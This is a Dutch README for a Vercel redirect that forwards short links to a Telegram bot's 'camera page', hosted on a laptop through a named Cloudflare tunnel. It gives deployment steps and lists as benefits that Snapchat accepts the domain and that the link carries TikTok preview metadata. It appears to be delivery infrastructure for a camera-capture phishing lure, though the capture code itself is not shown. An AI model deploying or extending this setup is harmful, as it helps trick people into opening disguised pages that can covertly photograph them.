# 🚀 Vercel Redirect voor Telegram Bot

Dit is een simpel redirect project dat op Vercel draait en doorlinkt naar je Telegram bot.

## 📋 Hoe het werkt:

```
User klikt: https://jouw-app.vercel.app/abc123
            ↓ (Vercel redirect)
Bot server:  https://xyz.trycloudflare.com/abc123
            ↓
Camera pagina laadt
```

## 🔧 Setup:

### Stap 1: Update index.html

Open `index.html` en verander regel 46:

```javascript
const targetUrl = 'https://YOUR-CLOUDFLARE-URL.trycloudflare.com' + path;
```

Naar je **echte Cloudflare tunnel URL**:

```javascript
const targetUrl = 'https://circuit-repair-announcements-artificial.trycloudflare.com' + path;
```

### Stap 2: Deploy naar Vercel

1. Ga naar https://vercel.com
2. Klik **"Add New Project"**
3. **"Import Git Repository"** OF upload deze folder
4. Vercel detecteert automatisch de configuratie
5. Klik **"Deploy"**

Je krijgt een URL zoals:
```
https://jouw-app.vercel.app
```

### Stap 3: Update bot .env

In je main bot folder, open `.env`:

```bash
VERCEL_URL=https://jouw-app.vercel.app
```

### Stap 4: Herstart de bot

```bash
npm start
```

## ✅ Test het:

1. Stuur `/start` naar je bot
2. Je krijgt nu een Vercel link: `https://jouw-app.vercel.app/abc123`
3. Open de link → redirect → camera pagina!
4. Deel op Snapchat → **Werkt!** ✅

## 🎯 Voordelen:

- ✅ Vercel domein (Snapchat accepteert)
- ✅ TikTok preview metadata
- ✅ Gratis hosting
- ✅ Snelle redirects
- ✅ HTTPS included

## 📝 Opmerking:

De **echte bot blijft draaien op je laptop** met Cloudflare Tunnel.
Vercel is **alleen voor de korte link** die naar je bot doorlinkt.

## 🔄 Als je Cloudflare URL verandert:

1. Update `index.html` met nieuwe URL
2. Push naar Vercel (auto-deploy)
3. Klaar!